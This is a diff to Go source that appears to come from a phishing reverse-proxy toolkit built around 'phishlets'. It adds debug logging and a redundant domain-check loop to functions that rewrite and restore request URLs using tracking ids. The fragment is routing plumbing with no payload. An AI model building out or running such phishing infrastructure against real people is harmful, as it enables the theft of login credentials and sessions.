@@ -66,16 +66,24 @@ func checkAndRewriteRequest(pl *Phishlet, req *http.Request) (redirectUrl string
 		for _, d := range ru.triggerDomains {
 			if d == host {
 				domainMatch = true
+				log.Debug("rewrite_url: matched domain '%s' for path '%s'", d, path)
 				break
 			}
 		}
 		if !domainMatch {
 			continue
 		}
-		for _, p := range ru.triggerPaths {
-			if p == path {
+		for _, triggerPath := range ru.triggerPaths {
+			if triggerPath == path {
 				tid = genTid()
 				origUrl := path
+				for _, d := range ru.triggerDomains {
+					if d == host {
+						domainMatch = true
+						log.Debug("rewrite_url: matched domain '%s' for path '%s'\ntid=%s", d, path, tid)
+						break
+					}
+				}
 				if req.URL.RawQuery != "" {
 					origUrl += "?" + req.URL.RawQuery
 				}
@@ -94,6 +102,7 @@ func checkAndRewriteRequest(pl *Phishlet, req *http.Request) (redirectUrl string
 				if len(q) > 0 {
 					redirectUrl += "?" + q.Encode()
 				}
+				log.Debug("rewrite_url: redirecting to '%s' with tid '%s'", redirectUrl, tid)
 				return redirectUrl, tid, true
 			}
 		}
@@ -107,6 +116,7 @@ func restoreOriginalUrlIfTid(req *http.Request) bool {
 	if tid == "" {
 		return false
 	}
+	log.Debug("restoreOriginalUrlIfTid: checking tid '%s'", tid)
 	tidUrlMap.RLock()
 	orig, ok := tidUrlMap.m[tid]
 	tidUrlMap.RUnlock()
@@ -119,6 +129,7 @@ func restoreOriginalUrlIfTid(req *http.Request) bool {
 	}
 	req.URL.Path = u.Path
 	req.URL.RawQuery = u.RawQuery
+	log.Debug("restoreOriginalUrlIfTid: restored original URL '%s' for tid '%s'", req.URL.String(), tid)
 	return true
 }
 
